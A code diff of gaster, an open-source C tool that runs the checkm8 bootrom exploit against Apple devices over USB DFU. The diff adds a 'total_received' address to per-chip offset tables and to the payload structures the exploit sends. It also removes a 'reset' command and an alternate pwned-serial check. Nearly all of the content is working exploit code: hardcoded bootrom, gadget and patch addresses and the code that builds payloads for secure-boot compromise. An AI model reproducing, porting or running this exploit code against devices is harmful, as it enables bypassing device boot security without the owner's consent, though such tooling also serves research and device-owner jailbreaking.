@@ -232,7 +232,7 @@ static struct {
 	uint8_t i_manufacturer, i_product, i_serial_number, b_num_configurations;
 } device_descriptor;
 static size_t config_hole, ttbr0_vrom_off, ttbr0_sram_off, config_large_leak, config_overwrite_pad = offsetof(eclipsa_overwrite_t, synopsys_task.callout);
-static uint64_t tlbi, nop_gadget, ret_gadget, patch_addr, ttbr0_addr, func_gadget, write_ttbr0, memcpy_addr, aes_crypto_cmd, io_buffer_addr, boot_tramp_end, gUSBSerialNumber, dfu_handle_request, usb_core_do_transfer, arch_task_tramp_addr, insecure_memory_base, synopsys_routine_addr, handle_interface_request, usb_create_string_descriptor, usb_serial_number_string_descriptor;
+static uint64_t tlbi, nop_gadget, ret_gadget, patch_addr, ttbr0_addr, func_gadget, write_ttbr0, memcpy_addr, aes_crypto_cmd, total_received, io_buffer_addr, boot_tramp_end, gUSBSerialNumber, dfu_handle_request, usb_core_do_transfer, arch_task_tramp_addr, insecure_memory_base, synopsys_routine_addr, handle_interface_request, usb_create_string_descriptor, usb_serial_number_string_descriptor;
 
 static void
 sleep_ms(unsigned ms) {
@@ -669,6 +669,7 @@ checkm8_check_usb_device(usb_handle_t *handle, void *pwned) {
 			config_overwrite_pad = 0x640;
 			memcpy_addr = 0x9ACC;
 			aes_crypto_cmd = 0x7301;
+			total_received = 0x10061A7C;
 			gUSBSerialNumber = 0x10061F80;
 			dfu_handle_request = 0x10061A24;
 			payload_dest_armv7 = 0x10079800;
@@ -683,6 +684,7 @@ checkm8_check_usb_device(usb_handle_t *handle, void *pwned) {
 			config_overwrite_pad = 0x640;
 			memcpy_addr = 0x9B0C;
 			aes_crypto_cmd = 0x7341;
+			total_received = 0x10061A7C;
 			gUSBSerialNumber = 0x10061F80;
 			dfu_handle_request = 0x10061A24;
 			payload_dest_armv7 = 0x10079800;
@@ -697,6 +699,7 @@ checkm8_check_usb_device(usb_handle_t *handle, void *pwned) {
 			config_overwrite_pad = 0x660;
 			memcpy_addr = 0x9A3C;
 			aes_crypto_cmd = 0x7061;
+			total_received = 0x3402D8F4;
 			gUSBSerialNumber = 0x3402DDF8;
 			dfu_handle_request = 0x3402D92C;
 			payload_dest_armv7 = 0x34039800;
@@ -712,6 +715,7 @@ checkm8_check_usb_device(usb_handle_t *handle, void *pwned) {
 			patch_addr = 0x100005CE0;
 			memcpy_addr = 0x10000ED50;
 			aes_crypto_cmd = 0x10000B9A8;
+			total_received = 0x180086C28;
 			boot_tramp_end = 0x1800E1000;
 			gUSBSerialNumber = 0x180086CDC;
 			dfu_handle_request = 0x180086C70;
@@ -725,6 +729,7 @@ checkm8_check_usb_device(usb_handle_t *handle, void *pwned) {
 			patch_addr = 0x10000AD04;
 			memcpy_addr = 0x100013F10;
 			aes_crypto_cmd = 0x100010A90;
+			total_received = 0x180088D7C;
 			io_buffer_addr = 0x18010D500;
 			boot_tramp_end = 0x1800E1000;
 			gUSBSerialNumber = 0x180088E48;
@@ -741,6 +746,7 @@ checkm8_check_usb_device(usb_handle_t *handle, void *pwned) {
 			patch_addr = 0x100007E98;
 			memcpy_addr = 0x100010E70;
 			aes_crypto_cmd = 0x10000DA90;
+			total_received = 0x1800887FC;
 			io_buffer_addr = 0x18010D300;
 			boot_tramp_end = 0x1800E1000;
 			gUSBSerialNumber = 0x1800888C8;
@@ -758,6 +764,7 @@ checkm8_check_usb_device(usb_handle_t *handle, void *pwned) {
 			config_overwrite_pad = 0x300;
 			memcpy_addr = 0x89F4;
 			aes_crypto_cmd = 0x6341;
+			total_received = 0x46005860;
 			gUSBSerialNumber = 0x46005958;
 			dfu_handle_request = 0x46005898;
 			payload_dest_armv7 = 0x46007800;
@@ -772,6 +779,7 @@ checkm8_check_usb_device(usb_handle_t *handle, void *pwned) {
 			ttbr0_addr = 0x1800C8000;
 			memcpy_addr = 0x100011030;
 			aes_crypto_cmd = 0x10000DAA0;
+			total_received = 0x18008787C;
 			ttbr0_vrom_off = 0x400;
 			io_buffer_addr = 0x18010D500;
 			boot_tramp_end = 0x1800E1000;
@@ -790,6 +798,7 @@ checkm8_check_usb_device(usb_handle_t *handle, void *pwned) {
 			ttbr0_addr = 0x1800C8000;
 			memcpy_addr = 0x100011030;
 			aes_crypto_cmd = 0x10000DAA0;
+			total_received = 0x18008787C;
 			ttbr0_vrom_off = 0x400;
 			io_buffer_addr = 0x18010D500;
 			boot_tramp_end = 0x1800E1000;
@@ -815,6 +824,7 @@ checkm8_check_usb_device(usb_handle_t *handle, void *pwned) {
 			write_ttbr0 = 0x1000003B4;
 			memcpy_addr = 0x1000106F0;
 			aes_crypto_cmd = 0x10000C9D4;
+			total_received = 0x18004C2FC;
 			boot_tramp_end = 0x180044000;
 			ttbr0_vrom_off = 0x400;
 			ttbr0_sram_off = 0x600;
@@ -831,6 +841,7 @@ checkm8_check_usb_device(usb_handle_t *handle, void *pwned) {
 			config_overwrite_pad = 0x5C0;
 			memcpy_addr = 0xB6F8;
 			aes_crypto_cmd = 0x86DD;
+			total_received = 0x48806304;
 			gUSBSerialNumber = 0x48802AB8;
 			dfu_handle_request = 0x48806344;
 			payload_dest_armv7 = 0x48806E00;
@@ -845,6 +856,7 @@ checkm8_check_usb_device(usb_handle_t *handle, void *pwned) {
 			config_overwrite_pad = 0x5C0;
 			memcpy_addr = 0xA884;
 			aes_crypto_cmd = 0x786D;
+			total_received = 0x48806344;
 			gUSBSerialNumber = 0x48802AE8;
 			dfu_handle_request = 0x48806384;
 			payload_dest_armv7 = 0x48806E00;
@@ -866,6 +878,7 @@ checkm8_check_usb_device(usb_handle_t *handle, void *pwned) {
 			write_ttbr0 = 0x1000003E4;
 			memcpy_addr = 0x100010730;
 			aes_crypto_cmd = 0x10000C8F4;
+			total_received = 0x180088ACC;
 			boot_tramp_end = 0x1800B0000;
 			ttbr0_vrom_off = 0x400;
 			ttbr0_sram_off = 0x600;
@@ -889,6 +902,7 @@ checkm8_check_usb_device(usb_handle_t *handle, void *pwned) {
 			write_ttbr0 = 0x1000003F4;
 			memcpy_addr = 0x100010950;
 			aes_crypto_cmd = 0x10000C994;
+			total_received = 0x1800889DC;
 			boot_tramp_end = 0x1800B0000;
 			ttbr0_vrom_off = 0x400;
 			ttbr0_sram_off = 0x600;
@@ -912,6 +926,7 @@ checkm8_check_usb_device(usb_handle_t *handle, void *pwned) {
 			write_ttbr0 = 0x10000045C;
 			memcpy_addr = 0x10000E9D0;
 			aes_crypto_cmd = 0x100009E9C;
+			total_received = 0x1800085BC;
 			boot_tramp_end = 0x18001C000;
 			ttbr0_vrom_off = 0x400;
 			ttbr0_sram_off = 0x600;
@@ -935,6 +950,7 @@ checkm8_check_usb_device(usb_handle_t *handle, void *pwned) {
 			write_ttbr0 = 0x100000444;
 			memcpy_addr = 0x10000EA30;
 			aes_crypto_cmd = 0x1000082AC;
+			total_received = 0x180008A8C;
 			boot_tramp_end = 0x18001C000;
 			ttbr0_vrom_off = 0x400;
 			ttbr0_sram_off = 0x600;
@@ -948,7 +964,7 @@ checkm8_check_usb_device(usb_handle_t *handle, void *pwned) {
 		}
 		if(cpid != 0) {
 			printf("CPID: 0x%" PRIX32 "\n", cpid);
-			*(bool *)pwned = strstr(usb_serial_num, pwnd_str) != NULL || strstr(usb_serial_num, " PWND:[ipwnder]") != NULL;
+			*(bool *)pwned = strstr(usb_serial_num, pwnd_str) != NULL;
 			ret = true;
 		}
 		free(usb_serial_num);
@@ -1167,13 +1183,13 @@ read_binary_file(const char *filename, uint8_t **buf, size_t *len) {
 static bool
 checkm8_stage_patch(const usb_handle_t *handle) {
 	struct {
-		uint64_t pwnd[2], payload_dest, dfu_handle_request, payload_off, payload_sz, memcpy_addr, gUSBSerialNumber, usb_create_string_descriptor, usb_serial_number_string_descriptor, ttbr0_vrom_addr, patch_addr;
+		uint64_t pwnd[2], payload_dest, dfu_handle_request, payload_off, payload_sz, memcpy_addr, gUSBSerialNumber, usb_create_string_descriptor, usb_serial_number_string_descriptor, ttbr0_vrom_addr, patch_addr, total_received;
 	} A9;
 	struct {
-		uint64_t pwnd[2], payload_dest, dfu_handle_request, payload_off, payload_sz, memcpy_addr, gUSBSerialNumber, usb_create_string_descriptor, usb_serial_number_string_descriptor, patch_addr;
+		uint64_t pwnd[2], payload_dest, dfu_handle_request, payload_off, payload_sz, memcpy_addr, gUSBSerialNumber, usb_create_string_descriptor, usb_serial_number_string_descriptor, patch_addr, total_received;
 	} notA9;
 	struct {
-		uint32_t pwnd[4], payload_dest, dfu_handle_request, payload_off, payload_sz, memcpy_addr, gUSBSerialNumber, usb_create_string_descriptor, usb_serial_number_string_descriptor;
+		uint32_t pwnd[4], payload_dest, dfu_handle_request, payload_off, payload_sz, memcpy_addr, gUSBSerialNumber, usb_create_string_descriptor, usb_serial_number_string_descriptor, total_received;
 	} notA9_armv7;
 	struct {
 		uint64_t handle_interface_request, insecure_memory_base, exec_magic, done_magic, memc_magic, memcpy_addr, usb_core_do_transfer;
@@ -1278,6 +1294,7 @@ checkm8_stage_patch(const usb_handle_t *handle) {
 				A9.usb_serial_number_string_descriptor = usb_serial_number_string_descriptor;
 				A9.ttbr0_vrom_addr = ttbr0_addr + ttbr0_vrom_off;
 				A9.patch_addr = patch_addr;
+				A9.total_received = total_received;
 				memcpy(data + data_sz, &A9, sizeof(A9));
 				data_sz += sizeof(A9);
 				memcpy(data + data_sz, payload_handle_checkm8_request, payload_handle_checkm8_request_sz);
@@ -1306,6 +1323,7 @@ checkm8_stage_patch(const usb_handle_t *handle) {
 				if(cpid == 0x8001 || cpid == 0x8010 || cpid == 0x8011 || cpid == 0x8012 || cpid == 0x8015) {
 					notA9.patch_addr += ARM_16K_TT_L2_SZ;
 				}
+				notA9.total_received = total_received;
 				memcpy(data + data_sz, &notA9, sizeof(notA9));
 				data_sz += sizeof(notA9);
 				memcpy(data + data_sz, payload_handle_checkm8_request, payload_handle_checkm8_request_sz);
@@ -1330,6 +1348,7 @@ checkm8_stage_patch(const usb_handle_t *handle) {
 				notA9_armv7.gUSBSerialNumber = (uint32_t)gUSBSerialNumber;
 				notA9_armv7.usb_create_string_descriptor = (uint32_t)usb_create_string_descriptor;
 				notA9_armv7.usb_serial_number_string_descriptor = (uint32_t)usb_serial_number_string_descriptor;
+				notA9_armv7.total_received = (uint32_t)total_received;
 				memcpy(data + data_sz, &notA9_armv7, sizeof(notA9_armv7));
 				data_sz += sizeof(notA9_armv7);
 				memcpy(data + data_sz, payload_handle_checkm8_request, payload_handle_checkm8_request_sz);
@@ -1796,18 +1815,6 @@ gaster_decrypt_file(usb_handle_t *handle, const char *src_filename, const char *
 	return ret;
 }
 
-static bool
-gaster_reset(usb_handle_t *handle) {
-	init_usb_handle(handle, APPLE_VID, DFU_MODE_PID);
-	if(wait_usb_handle(handle, 0, 0, NULL, NULL)) {
-		send_usb_control_request_no_data(handle, 0x21, DFU_CLR_STATUS, 0, 0, 0, NULL);
-		reset_usb_handle(handle);
-		close_usb_handle(handle);
-		return true;
-	}
-	return false;
-}
-
 int
 main(int argc, char **argv) {
 	char *env_usb_timeout = getenv("USB_TIMEOUT");
@@ -1821,11 +1828,7 @@ main(int argc, char **argv) {
 #ifndef HAVE_LIBUSB
 	manual_reset = getenv("MANUAL_RESET") != NULL;
 #endif
-	if(argc == 2 && strcmp(argv[1], "reset") == 0) {
-		if(gaster_reset(&handle)) {
-			ret = 0;
-		}
-	} else if(argc == 2 && strcmp(argv[1], "pwn") == 0) {
+	if(argc == 2 && strcmp(argv[1], "pwn") == 0) {
 		if(gaster_checkm8(&handle)) {
 			ret = 0;
 		}
@@ -1845,7 +1848,6 @@ main(int argc, char **argv) {
 		puts("MANUAL_RESET - Manually reset the device");
 #endif
 		puts("options:");
-		puts("reset - Reset DFU counters");
 		puts("pwn - Put the device in pwned DFU mode");
 		puts("decrypt src dst - Decrypt file using GID0 AES key");
 		puts("decrypt_kbag kbag - Decrypt KBAG using GID0 AES key");
